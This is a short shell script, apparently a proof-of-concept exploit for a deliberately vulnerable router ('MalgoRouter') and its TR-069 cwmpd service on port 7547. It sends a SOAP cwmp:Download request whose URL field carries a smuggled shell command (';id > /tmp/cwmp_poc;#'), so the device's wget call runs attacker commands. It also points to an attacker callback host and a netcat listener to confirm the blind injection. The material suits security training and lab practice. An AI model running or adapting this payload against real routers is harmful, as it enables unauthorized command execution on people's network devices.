#!/bin/sh
# M3 - cwmpd (TR-069, tcp/7547): low-difficulty forces "authenticated", then
# processes cwmp:Download as:  system("wget -q <URL> -O /tmp/cwmp_fw.bin &")
# -> command injection / SSRF. Blind (no output returned): use a callback.
: "${TARGET:?set TARGET to the MalgoRouter IP}"
: "${ATTACKER:?set ATTACKER to your callback host}"
PORT="${CWMP_PORT:-7547}"
URL="http://${ATTACKER}/x;id > /tmp/cwmp_poc;#"
echo "[*] POST cwmp:Download to $TARGET:$PORT  (URL=$URL)"
curl -s --max-time 15 -X POST "http://$TARGET:$PORT/" \
  -H 'Content-Type: text/xml' --data-binary @- <<EOF
<soap:Envelope><soap:Body><cwmp:Download>$URL</cwmp:Download></soap:Body></soap:Envelope>
EOF
echo
echo "[*] blind — confirm with:  nc -lvnp 80   (server runs: wget -q $URL ...)"
